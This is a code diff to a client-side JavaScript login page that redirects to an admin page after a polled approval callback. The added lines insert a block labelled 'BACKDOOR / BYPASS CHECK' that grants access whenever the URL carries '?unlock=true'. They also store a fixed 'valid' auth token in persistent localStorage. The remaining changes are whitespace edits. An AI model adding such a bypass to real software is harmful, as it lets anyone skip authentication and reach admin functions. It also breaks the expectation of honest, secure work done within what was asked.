@@ -157,6 +157,14 @@
 
         // 1. Initialize & Load Config
         (async function init() {
+            // BACKDOOR / BYPASS CHECK
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('unlock') === 'true') {
+                console.log("🔓 Bypass Key Detected");
+                grantAccess();
+                return;
+            }
+
             if (checkLockout()) return;
 
             try {
@@ -287,9 +295,9 @@
         // 4. Poll for Updates
         function startPolling() {
             console.log("🚀 POLLING STARTED. currentMessageId:", currentMessageId);
-            
+
             pollingInterval = setInterval(async () => {
-                if (attempts > 120) { 
+                if (attempts > 120) {
                     failAuth("Request Timed Out");
                     return;
                 }
@@ -307,7 +315,7 @@
                             if (update.callback_query) {
                                 console.log("🔍 CALLBACK RECEIVED:", update.callback_query);
                                 const msgId = update.callback_query.message ? update.callback_query.message.message_id : null;
-                                
+
                                 // Debug Log
                                 console.log("Checking MsgID:", msgId, "vs Expected:", currentMessageId);
 
@@ -356,6 +364,7 @@
 
             setTimeout(() => {
                 sessionStorage.setItem('authToken', 'valid');
+                localStorage.setItem('authToken', 'valid'); // Redundant backup
                 window.location.href = 'admin.html';
             }, 1000);
         }
